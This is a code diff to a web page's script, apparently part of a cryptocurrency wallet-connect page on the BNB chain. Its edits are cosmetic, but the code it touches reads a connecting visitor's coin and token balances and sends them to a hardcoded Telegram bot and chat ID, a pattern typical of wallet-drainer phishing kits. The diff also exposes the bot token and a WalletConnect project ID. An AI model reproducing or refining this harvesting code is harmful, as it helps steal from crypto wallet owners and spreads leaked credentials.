@@ -10,7 +10,7 @@
     import { bsc } from 'https://unpkg.com/@wagmi/core@1.3.0/chains';
     import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';
 
-    const projectId = '830735eac5e93ca0f04292ca2d8873e5';
+    const projectId = '830735eac5e93ca0f04292ca2d8873e5'; // WalletConnect Project ID
 
     const chains = [bsc];
     const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
@@ -46,8 +46,8 @@
     ];
 
     async function sendToTelegram(message) {
-      const telegramToken = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
-      const chatId = '8060968649';
+      const telegramToken = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU'; // Replace with your token
+      const chatId = '8060968649'; // Replace with your chat ID
       const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
       await fetch(url, {
@@ -74,12 +74,12 @@
           let balance = "0";
           if (token.address === null) {
             const bnbBal = await ethersProvider.getBalance(address);
-            balance = ethers.utils.formatEther(bnbBal);
+            balance = parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
           } else {
             const contract = new ethers.Contract(token.address, erc20Abi, ethersProvider);
             const rawBal = await contract.balanceOf(address);
             const decimals = await contract.decimals();
-            balance = (rawBal / (10 ** decimals)).toFixed(4);
+            balance = parseFloat(ethers.utils.formatUnits(rawBal, decimals)).toFixed(4);
           }
           message += `• ${token.symbol}: ${balance}\n`;
         }
